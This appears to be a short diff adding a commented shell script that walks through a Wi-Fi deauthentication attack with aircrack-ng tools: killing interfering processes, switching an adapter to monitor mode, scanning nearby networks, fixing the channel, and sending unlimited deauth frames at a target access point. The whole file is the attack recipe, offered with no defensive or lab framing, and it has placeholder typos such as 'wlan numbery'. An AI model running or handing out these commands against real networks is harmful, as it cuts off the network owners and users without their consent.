@@ -1,0 +1,10 @@
+#clear previous airmon
+sudo airmon-ng check kill
+#go to monitor mode
+sudo airmon-ng start wlan number (e.g. wlan0)
+#nearby network
+sudo airodump-ng wlan number 
+#lock target 
+sudo iwconfig wlan number  channel number
+#deauth attack
+sudo aireplay-ng --deauth 0 -a bssid wlan numbery
